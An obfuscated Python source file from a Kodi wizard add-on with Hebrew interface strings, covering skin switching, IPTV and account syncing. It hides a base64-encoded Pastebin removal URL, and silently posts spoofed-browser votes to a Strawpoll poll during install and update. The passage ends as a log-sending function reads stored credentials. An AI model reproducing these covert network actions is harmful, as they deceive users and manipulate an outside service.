# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
DP2 =xbmcgui .DialogProgressBG ()#line:67
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	O00O0OO0O000O000O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OO000OO000000OOOO =[];OO00OOOOO0OO0OO0O =[]#line:267
	for OO00O00OO0OOOO00O in sorted (O00O0OO0O000O000O ,key =lambda OO0OOOOOO0O0OO0O0 :OO0OOOOOO0O0OO0O0 ):#line:268
		O000O00OOOO00O00O =os .path .split (OO00O00OO0OOOO00O [:-1 ])[1 ]#line:269
		OO00OOOOOOO0O0O0O =os .path .join (OO00O00OO0OOOO00O ,'addon.xml')#line:270
		if os .path .exists (OO00OOOOOOO0O0O0O ):#line:271
			OOOO000O0000000O0 =open (OO00OOOOOOO0O0O0O )#line:272
			OO0OOOOO0O00O000O =OOOO000O0000000O0 .read ()#line:273
			OOOO0OOOO0OO0OOOO =parseDOM2 (OO0OOOOO0O00O000O ,'addon',ret ='id')#line:274
			OOO0O0O0OO00O0OOO =O000O00OOOO00O00O if len (OOOO0OOOO0OO0OOOO )==0 else OOOO0OOOO0OO0OOOO [0 ]#line:275
			try :#line:276
				O0OO000OO0O0O0000 =xbmcaddon .Addon (id =OOO0O0O0OO00O0OOO )#line:277
				OO000OO000000OOOO .append (O0OO000OO0O0O0000 .getAddonInfo ('name'))#line:278
				OO00OOOOO0OO0OO0O .append (OOO0O0O0OO00O0OOO )#line:279
			except :#line:280
				pass #line:281
	O00O000OO0OOO0O0O =[];OO0O00000O00OOO00 =0 #line:282
	O00O00O000O0O0OO0 =["Current Skin -- %s"%currSkin ()]+OO000OO000000OOOO #line:283
	OO0O00000O00OOO00 =DIALOG .select ("Select the Skin you want to swap with.",O00O00O000O0O0OO0 )#line:284
	if OO0O00000O00OOO00 ==-1 :return #line:285
	else :#line:286
		OOOO0O0O000O00O00 =(OO0O00000O00OOO00 -1 )#line:287
		O00O000OO0OOO0O0O .append (OOOO0O0O000O00O00 )#line:288
		O00O00O000O0O0OO0 [OO0O00000O00OOO00 ]="%s"%(OO000OO000000OOOO [OOOO0O0O000O00O00 ])#line:289
	if O00O000OO0OOO0O0O ==None :return #line:290
	for OO00OOOO0OOOO000O in O00O000OO0OOO0O0O :#line:291
		swapSkins (OO00OOOOO0OO0OO0O [OO00OOOO0OOOO000O ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O0O0OO00OOOO0OOO0 ,title ="Error"):#line:296
	O00000O0OO00000O0 ='lookandfeel.skin'#line:297
	OO0O0OOO000O0O0OO =O0O0OO00OOOO0OOO0 #line:298
	OOO0OOOOO00O0O0OO =getOld (O00000O0OO00000O0 )#line:299
	OOO0OOO0OO00O0OO0 =O00000O0OO00000O0 #line:300
	setNew (OOO0OOO0OO00O0OO0 ,OO0O0OOO000O0O0OO )#line:301
	OO000O0O000O00000 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO000O0O000O00000 <100 :#line:303
		OO000O0O000O00000 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (O000O000O0OO0O0O0 ):#line:310
	try :#line:311
		O000O000O0OO0O0O0 ='"%s"'%O000O000O0OO0O0O0 #line:312
		O0OOO00O000000OOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O000O000O0OO0O0O0 )#line:313
		O000O0O00OOO000O0 =xbmc .executeJSONRPC (O0OOO00O000000OOO )#line:315
		O000O0O00OOO000O0 =simplejson .loads (O000O0O00OOO000O0 )#line:316
		if O000O0O00OOO000O0 .has_key ('result'):#line:317
			if O000O0O00OOO000O0 ['result'].has_key ('value'):#line:318
				return O000O0O00OOO000O0 ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (O00000O0O00O0OOOO ,OOO0OO00OO000000O ):#line:325
	try :#line:326
		O00000O0O00O0OOOO ='"%s"'%O00000O0O00O0OOOO #line:327
		OOO0OO00OO000000O ='"%s"'%OOO0OO00OO000000O #line:328
		OOO00OO00OOO000O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O00000O0O00O0OOOO ,OOO0OO00OO000000O )#line:329
		O0O0OO0OOO0OOOO00 =xbmc .executeJSONRPC (OOO00OO00OOO000O0 )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			OOOO0OOOOO0OO0000 =xbmcgui .DialogProgress ()#line:340
			OOOO0OOOOO0OO0000 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			OOOO0OOOOO0OO0000 .update (0 )#line:344
			for OO0O0OOO0O0OO0OO0 in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				OOOO0OOOOO0OO0000 .update (int ((5 -OO0O0OOO0O0OO0OO0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0O0OOO0O0OO0OO0 ),'')#line:347
				if OOOO0OOOOO0OO0000 .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			OOOO0OOOOO0OO0000 =xbmcgui .DialogProgress ()#line:353
			OOOO0OOOOO0OO0000 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			OOOO0OOOOO0OO0000 .update (0 )#line:357
			for OO0O0OOO0O0OO0OO0 in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				OOOO0OOOOO0OO0000 .update (int ((5 -OO0O0OOO0O0OO0OO0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0O0OOO0O0OO0OO0 ),'')#line:360
				if OOOO0OOOOO0OO0000 .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O00OO00000000OO00 ='18773068'#line:373
    O0O0O0OOO0O0OO0O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OO00000000OO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    OOO0OO00OO0O000O0 ='145273320'#line:387
    O000OOO0O000O000O ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O00O00000OOO0O000 =OOO0OO00OO0O000O0 #line:390
    else :#line:391
        O00O00000OOO0O000 =O000OOO0O000O000O #line:392
    OO00OOO0OOOO00O00 ={'options':O00O00000OOO0O000 }#line:396
    OOOOO0O0OO0O00OO0 =requests .post ('https://www.strawpoll.me/'+O00OO00000000OO00 ,headers =O0O0O0OOO0O0OO0O0 ,data =OO00OOO0OOOO00O00 )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        O0000OO0OOOOO0OO0 ='18773068'#line:402
        OOOO000OOOO000O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0000OO0OOOOO0OO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O000OO0000000OO0O ='145273320'#line:416
        O0OO000000O0OO0O0 ={'options':O000OO0000000OO0O }#line:422
        O0000OOO0OOOOOO00 =requests .post ('https://www.strawpoll.me/'+O0000OO0OOOOO0OO0 ,headers =OOOO000OOOO000O0O ,data =O0OO000000O0OO0O0 )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        OOOO00OOOOOOOOO00 ='18773068'#line:429
        OO0OO00O000000O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOO00OOOOOOOOO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        O0OO0OO00OO0OOO00 ='145273321'#line:443
        O0000O0O0O0000O00 ={'options':O0OO0OO00OO0OOO00 }#line:449
        O0O0OO000OOO00000 =requests .post ('https://www.strawpoll.me/'+OOOO00OOOOOOOOO00 ,headers =OO0OO00O000000O0O ,data =O0000O0O0O0000O00 )#line:451
   except :pass #line:452
def testcommand ():#line:456
 OO0O000000OO00O0O =os .path .dirname (os .path .realpath (__file__ ))#line:457
 O0O00O0000O0OOO0O =os .path .join (OO0O000000OO00O0O ,'changelog.txt')#line:458
 OOOOOOO0O0O0O0OO0 =open (O0O00O0000O0OOO0O ,'r')#line:459
 O0000O00OOO0O0O00 =OOOOOOO0O0O0O0OO0 .read ()#line:460
 OO000O0O0O0O0O0OO =O0000O00OOO0O0O00 #line:461
 notify .updateinfo (OO000O0O0O0O0O0OO ,True )#line:462
def skin_homeselect ():#line:463
	try :#line:465
		O000OO000OOOOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:466
		OO0000O0OOOOOO0O0 =open (O000OO000OOOOOO00 ,'r')#line:468
		OO0O00O0OOO000OO0 =OO0000O0OOOOOO0O0 .read ()#line:469
		OO0000O0OOOOOO0O0 .close ()#line:470
		O000000000000O000 ='<setting id="HomeS" type="string(.+?)/setting>'#line:471
		OOOO000O000OO0O00 =re .compile (O000000000000O000 ).findall (OO0O00O0OOO000OO0 )[0 ]#line:472
		OO0000O0OOOOOO0O0 =open (O000OO000OOOOOO00 ,'w')#line:473
		OO0000O0OOOOOO0O0 .write (OO0O00O0OOO000OO0 .replace ('<setting id="HomeS" type="string%s/setting>'%OOOO000O000OO0O00 ,'<setting id="HomeS" type="string"></setting>'))#line:474
		OO0000O0OOOOOO0O0 .close ()#line:475
	except :#line:476
		pass #line:477
def autotrakt ():#line:480
    OOO0O0OOO0OOO0OOO =(ADDON .getSetting ("auto_trk"))#line:481
    if OOO0O0OOO0OOO0OOO =='true':#line:482
       from resources .libs import trk_aut #line:483
def traktsync ():#line:485
     OO0OOOO0O00O0OO0O =(ADDON .getSetting ("auto_trk"))#line:486
     if OO0OOOO0O00O0OO0O =='true':#line:487
       from resources .libs import trk_aut #line:490
     else :#line:491
        ADDON .openSettings ()#line:492
def imdb_synck ():#line:494
   try :#line:495
     O00O000O0OOOO0000 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:496
     OOO00O000OOO0O0O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:497
     O00O0OO0OOO00OO0O =(ADDON .getSetting ("imdb_sync"))#line:498
     O000O000O0OOO0O00 ="imdb.user"#line:499
     OOO0O0OO00O0O000O ="accounts.informants.imdb.user"#line:500
     O00O000O0OOOO0000 .setSetting (O000O000O0OOO0O00 ,str (O00O0OO0OOO00OO0O ))#line:501
     OOO00O000OOO0O0O0 .setSetting ('accounts.informants.imdb.enabled','true')#line:502
     OOO00O000OOO0O0O0 .setSetting (OOO0O0OO00O0O000O ,str (O00O0OO0OOO00OO0O ))#line:503
   except :pass #line:504
def dis_or_enable_addon (O0000OO0OOOOO00O0 ,OO00O000000OO00OO ,enable ="true"):#line:506
    import json #line:507
    OO0O0OOOOOO00OO00 ='"%s"'%O0000OO0OOOOO00O0 #line:508
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0000OO0OOOOO00O0 )and enable =="true":#line:509
        logging .warning ('already Enabled')#line:510
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0000OO0OOOOO00O0 )#line:511
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0000OO0OOOOO00O0 )and enable =="false":#line:512
        return xbmc .log ("### Skipped %s, reason = not installed"%O0000OO0OOOOO00O0 )#line:513
    else :#line:514
        O000OO0O000OOOO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0O0OOOOOO00OO00 ,enable )#line:515
        OO0O0O0OOO0OOOOOO =xbmc .executeJSONRPC (O000OO0O000OOOO0O )#line:516
        O0OOO0OOOOO00OO00 =json .loads (OO0O0O0OOO0OOOOOO )#line:517
        if enable =="true":#line:518
            xbmc .log ("### Enabled %s, response = %s"%(O0000OO0OOOOO00O0 ,O0OOO0OOOOO00OO00 ))#line:519
        else :#line:520
            xbmc .log ("### Disabled %s, response = %s"%(O0000OO0OOOOO00O0 ,O0OOO0OOOOO00OO00 ))#line:521
    if OO00O000000OO00OO =='auto':#line:522
     return True #line:523
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:524
def iptvset ():#line:527
  try :#line:528
    OOOOO00OO0OO000OO =(ADDON .getSetting ("iptv_on"))#line:529
    if OOOOO00OO0OO000OO =='true':#line:531
       if KODIV >=17 and KODIV <18 :#line:533
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:534
         OO0OO0O00OO0OOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:535
         OOO0O000O000O00OO =(ADDON .getSetting ("iptvUrl"))#line:537
         OO0OO0O00OO0OOO0O .setSetting ('m3uUrl',OOO0O000O000O00OO )#line:538
         OO0000000000000OO =(ADDON .getSetting ("epg_Url"))#line:539
         OO0OO0O00OO0OOO0O .setSetting ('epgUrl',OO0000000000000OO )#line:540
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:543
         iptvsimpldownpc ()#line:544
         wiz .kodi17Fix ()#line:545
         xbmc .sleep (1000 )#line:546
         OO0OO0O00OO0OOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:547
         OOO0O000O000O00OO =(ADDON .getSetting ("iptvUrl"))#line:548
         OO0OO0O00OO0OOO0O .setSetting ('m3uUrl',OOO0O000O000O00OO )#line:549
         OO0000000000000OO =(ADDON .getSetting ("epg_Url"))#line:550
         OO0OO0O00OO0OOO0O .setSetting ('epgUrl',OO0000000000000OO )#line:551
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:553
         iptvsimpldown ()#line:554
         wiz .kodi17Fix ()#line:555
         xbmc .sleep (1000 )#line:556
         OO0OO0O00OO0OOO0O =xbmcaddon .Addon ('pvr.iptvsimple')#line:557
         OOO0O000O000O00OO =(ADDON .getSetting ("iptvUrl"))#line:558
         OO0OO0O00OO0OOO0O .setSetting ('m3uUrl',OOO0O000O000O00OO )#line:559
         OO0000000000000OO =(ADDON .getSetting ("epg_Url"))#line:560
         OO0OO0O00OO0OOO0O .setSetting ('epgUrl',OO0000000000000OO )#line:561
  except :pass #line:562
def howsentlog ():#line:569
       try :#line:570
          import json #line:571
          OO000OO00O0O00O00 =(ADDON .getSetting ("user"))#line:572
          OO00OO0OOOO0OO0O0 =(ADDON .getSetting ("pass"))#line:573
          OO0O0O000O00O0O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:574
